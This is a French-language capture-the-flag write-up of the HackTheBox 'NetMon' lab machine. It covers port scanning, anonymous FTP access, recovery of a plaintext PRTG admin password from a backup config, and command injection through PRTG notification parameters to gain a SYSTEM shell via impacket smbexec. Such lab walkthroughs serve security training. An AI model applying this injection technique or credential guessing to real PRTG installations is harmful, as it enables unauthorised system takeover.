# Solution du CTF NetMon de HackTheBox

RealPain
--------

*NetMon* est un CTF facile (20 points seulement) basé sur Windows et proposé sur *HackTheBox*.  

Une partie de plaisir me direz-vous ? Le CTF était effectivement super facile mais entre les mots de passes réinitialisés en permanence, les resets intempestifs de la machine et les scripts kiddies qui lancent des exploits sans lire la moindre description ce CTF avait tout de l'enfer :p  

Free Flag
---------

On lance un masscan qui nous trouve les classiques ports Windows ainsi qu'un serveur FTP :  

```plain
$ sudo masscan -e tun0 --rate 1000 -p1-65535 10.10.10.152

Starting masscan 1.0.4 (http://bit.ly/14GZzcT)
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
Discovered open port 49675/tcp on 10.10.10.152                                 
Discovered open port 49664/tcp on 10.10.10.152                                 
Discovered open port 139/tcp on 10.10.10.152                                   
Discovered open port 21/tcp on 10.10.10.152                                    
Discovered open port 49665/tcp on 10.10.10.152                                 
Discovered open port 49669/tcp on 10.10.10.152                                 
Discovered open port 5985/tcp on 10.10.10.152                                  
Discovered open port 135/tcp on 10.10.10.152                                   
Discovered open port 49666/tcp on 10.10.10.152                                 
Discovered open port 49671/tcp on 10.10.10.152                                 
Discovered open port 47001/tcp on 10.10.10.152
```

Le port 80 est lui aussi ouvert même s'il ne l'était pas lors du scan (merci les skidz !)  

On se connecte en FTP avec le user *anonymous* et on se rend compte que le serveur nous livre son *C:* en lecture seule (les droits semblent être l'équivalent d'un compte *Invité* cependant).  

C'est suffisant pour lire le flag présent dans *c:\users\public\desktop\user.txt* (dd58ce6--- snip ---8d9255a5).  

PRTGWUT?
--------

En explorant le disque on voit différents fichiers en relation avec PRTG, comme *c:\windows\restart.bat* :  

```plain
net stop PRTGCoreService
copy "c:\Windows\PRTG Configuration.dat" "C:\ProgramData\Paessler\PRTG Network Monitor"
net start PRTGCoreService
```

Ce fichier *.dat* est en réalité un fichier XML contenant la configuration de [PRTG](https://www.paessler.com/prtg). PRTG est un logiciel de monitoring assez poussé. On y défini des règles de surveillance et si quelque chose tourne mal cela provoque une notification (génération d'un rapport, envoi d'un email, exécution d'un programme, etc).  

Le fichier de configuration semble contenir des entrées correspondant à des mots de passe mais ces entrées encodées en base64 ont été visiblement préalablement chiffrées.  

Toutefois en fouillant sur Internet j'ai trouvé [ce post](https://www.reddit.com/r/sysadmin/comments/835dai/prtg_exposes_domain_accounts_and_passwords_in/) sur *Reddit* faisait part d'un bug de PRTG ayant provoqué à un moment le stockage en clair des mots de passe.  

Et effectivement j'ai trouvé sur le disque le fichier *PRTG Configuration.old.bak* qui lui contient un mot de passe en commentaire :  

```html
<dbpassword>
        <!-- User: prtgadmin -->
        PrTg@dmin2018
</dbpassword>
```

On s'empresse de tester ce mot de passe et il ne fonctionne pas... On essaye *PrTg@dmin2019*... bingo ! Cela nous ouvre les portes de l'interface web de PRTG en écoute sur le port 80.  

Si le service était aussi souvent indisponible c'est que certains participants ont du chercher PRTG via *searchsploit* ou autre et on eu le résultat suivant :  

```plain
$ searchsploit prtg
------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                          |  Path
                                                                        | (/usr/share/exploitdb/)
------------------------------------------------------------------------ ----------------------------------------
PRTG Network Monitor < 18.1.39.1648 - Stack Overflow (Denial of Service)| exploits/windows_x86/dos/44500.py
PRTG Traffic Grapher 6.2.1 - 'url' Cross-Site Scripting                 | exploits/java/webapps/34108.txt
------------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result
```

Puis ils se sont empressés d'exécuter le code alors qu'il y a bien mentionné *Denial of Service* sur la gauche et *dos* dans le path X'D...  

Quoiqu'il en soit l'objectif est de créer une notification via le menu *Setup*. On choisit bien sûr une action de type exécution de commande.  

Seulement deux programmes sont proposés à l'exécution : un script bat que voici :  

```plain
REM Demo 'BAT' Notification for Paessler Network Monitor
REM Writes current Date/Time into a File
REM
REM How to use it:
REM
REM Create a exe-notification on PRTG, select 'Demo Exe Notifcation - OutFile.bat' as program,
REM The Parametersection consists of one parameter:
REM
REM - Filename
REM
REM e.g.
REM
REM         "C:\temp\test.txt"
REM
REM Note that the directory specified must exist.
REM Adapt Errorhandling to your needs.
REM This script comes without warranty or support.

Echo  %DATE% %TIME% >%1%
```

ou sa version *Powershell* que voici :  

```plain
if ($Args.Count -eq 0) {

  #No Arguments. Filename must be specified.

  exit 1;
 }elseif ($Args.Count -eq 1){

  $Path = split-path $Args[0];

  if (Test-Path $Path)
  {
    $Text = Get-Date;
    $Text | out-File $Args[0];
    exit 0;

  }else
  {
    # Directory does not exist.
    exit 2;
  }
}
```

L'injection se fait alors dans les paramètres que l'on passe au script choisit. Je pensais au début que le problème était lié à l'absence de guillemets ou apostrophes autour de *%1%* dans le batch mais en réalité les paramètres permettent d'injection directement ce que l'on veut.  

D'ailleurs on voit [au numéro 7 de cet article de la KB de PRTG](https://kb.paessler.com/en/topic/2543-how-can-i-execute-a-batch-file-as-notification) que PRTG conseillent eux-même d'encapsuler les paramètres entre double ou simple quotes à cet endroit... ça laisse supposer beaucoup de choses :D  

J'ai pu exploiter cela tout seul mais j'ai découvert au moment de l'écriture du présent article qu'il existe un blog traitant [de cette faille d'exécution de commande dans PRTG](https://www.codewatch.org/blog/?p=453).  

On pouvait alors créer un compte administrateur sur la machine de cette façon :  

![HackTheBox NetMon CTF PRTG notification command execution vulnerability](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/netmon_prtg_notif.png)

Comme le montre l'infobulle, au moment de la création de la notification il faut laisser vide les identifiants si on veut que la tache soit exécutée avec les droits du démon PRTG (qui tourne en SYSTEM).  

Quand on enregistre la notification, PRTG re-renseigne ces champs mais j'ai remarqué qu'au moins si un ~~enfoiré~~ impondérable change le mot de passe du compte *prtgadmin*, il suffit de re-supprimer le mot de passe dans la notification pour que celle-ci refonctionne (sinon elle échoue en raison du mot de passe qui n'est plus valide).  

Finalement on peut définir notre notification parmi les notifications de base (exécutées pour tous les événements) ou spécifiquement sur un événement.  

![HackTheBox NetMon CTF PRTG devices group notification](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/netmon_prtg_devices.png)

Une fois qu'on s'est battu pour que personne n'ai supprimé / modifié la notification ou changé le mot de passe tout est ok et on peut obtenir le flag root :  

```plain
$ PYTHONPATH=. python examples/smbexec.py NETMON/devloop:Uns3cUr3@10.10.10.152
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

Finally
-------

Au moment de ces lignes 2203 participants ont eu le flag user contre 741 seulement pour le flag root... cherchez l'erreur :(

*Published June 29 2019 at 18:25*